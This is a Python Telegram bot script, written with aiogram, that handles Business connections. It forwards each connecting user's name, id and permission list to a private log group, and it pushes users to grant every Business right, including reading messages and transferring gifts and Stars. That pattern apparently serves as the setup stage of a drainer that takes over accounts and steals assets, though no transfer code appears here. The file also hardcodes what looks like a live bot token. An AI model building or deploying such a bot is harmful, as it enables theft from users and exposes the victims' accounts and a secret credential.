import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import BusinessConnection
from aiogram.methods.get_business_connection import GetBusinessConnection
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.types import Message
from aiogram.utils.markdown import quote_html

BOT_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

ALL_RIGHTS = [
    'can_reply',
    'can_read_messages',
    'can_delete_outgoing_messages',
    'can_delete_all_messages',
    'can_edit_name',
    'can_edit_bio',
    'can_edit_profile_photo',
    'can_edit_username',
    'can_change_gift_settings',
    'can_view_gifts_and_stars',
    'can_convert_gifts_to_stars',
    'can_transfer_and_upgrade_gifts',
    'can_transfer_stars',
    'can_manage_stories',
]

@dp.business_connection()
async def on_business_connect(bc: BusinessConnection):
    try:
        info = await bot(GetBusinessConnection(business_connection_id=bc.id))
    except Exception as e:
        logging.error(f"Failed to get business connection: {e}")
        await bot.send_message(LOG_GROUP_ID, f"⚠️ Could not fetch Business Connection.\n\n<code>{quote_html(str(e))}</code>")
        return

    user = info.user
    username = f"@{user.username}" if user.username else user.first_name
    uid = user.id

    rights_dict = info.rights.model_dump() if info.rights else {}
    granted_rights = [k for k, v in rights_dict.items() if v]
    ungranted_rights = [k for k in ALL_RIGHTS if not rights_dict.get(k)]

    log_text = (
        f"🤖 <a href='tg://user?id={uid}'>{username}</a> added the bot via Business Chatbots.\n"
        f"Granted permissions:\n"
        f"<code>{', '.join(granted_rights) if granted_rights else 'None'}</code>\n"
        f"Missing permissions:\n"
        f"<code>{', '.join(ungranted_rights) if ungranted_rights else 'None'}</code>"
    )

    await bot.send_message(LOG_GROUP_ID, log_text)

    if not ungranted_rights:
        await bot.send_message(
            info.user_chat_id,
            "🟢 Welcome! All required Business permissions granted. You're ready to use all bot features!"
        )
    else:
        await bot.send_message(
            info.user_chat_id,
            f"⚠️ Missing some required permissions:\n<code>{', '.join(ungranted_rights)}</code>\n\nPlease review your bot's permissions in Business Settings."
        )

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    dp.run_polling(bot)
